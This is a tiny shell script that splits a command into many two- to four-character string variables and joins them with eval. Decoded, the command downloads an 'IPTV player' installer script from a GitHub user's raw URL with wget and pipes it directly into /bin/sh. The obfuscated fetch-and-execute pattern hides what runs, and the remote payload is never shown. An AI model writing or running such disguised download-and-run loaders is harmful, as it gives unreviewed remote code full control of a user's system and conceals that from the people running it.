z="
";Xz='sh';Ez='.git';Qz='ptvi';Hz='onte';Lz='37/i';Oz='r/ma';Wz='bin/';Nz='laye';Jz='om/e';Iz='nt.c';Cz='ps:/';Bz=' htt';Uz='-O -';Mz='ptvp';Tz='.sh ';Pz='in/i';Az='wget';Dz='/raw';Fz='hubu';Kz='mil2';Vz=' | /';Sz='ller';Gz='serc';Rz='nsta';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"